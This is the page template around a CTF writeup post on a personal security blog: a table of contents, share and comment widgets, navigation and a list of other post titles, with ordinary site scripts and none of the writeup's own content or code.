+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#game-server"><span class="toc-text">game server</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-file-amp-checksec"><span class="toc-text">0x00 file&amp;checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-IDA分析程序逻辑"><span class="toc-text">0x01 IDA分析程序逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+    <div class="share">
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"redhat2018—writeup　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    </div>
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = 'http://sp4n9x.github.io/2018/05/27/redhat2018—writeup/';
+            this.page.identifier = '2018/05/27/redhat2018—writeup/';
+        };
+        var loadComment = function() {
+            var d = document, s = d.createElement('script');
+            s.src = '//Sp4n9x.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
+<span class="disqus-comment-count" data-disqus-identifier="2018/05/27/redhat2018—writeup/"></span>
+<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2018/05/27/redhat2018—writeup/"></span>
+<script>
+    $(".disqus-comment-count").hide();
+    var $disqusCount = $(".disqus-comment-count");
+    $disqusCount.bind("DOMNodeInserted", function(e) {
+        $(".count-comment").text(
+            $(this).text().replace(/[^0-9]/ig,"")
+        )
+        DISQUSWIDGETS.getCount({reset: true});
+    })
+</script>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/06/01/CVE-2010-2883复现与分析/" title="上一篇: CVE-2010-2883复现与分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/" title="下一篇: 一步一步学ROP之Linux_x64篇-蒸米">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/06/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2020 Sp4n9x
+            </div>
+            <div class="footer-right">
+                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 10;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+             post: ".article-entry a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    <!-- 点击爱心效果 -->
+    <script src="/js/love.js"></script>
+  </div>
+</body>
+</html>
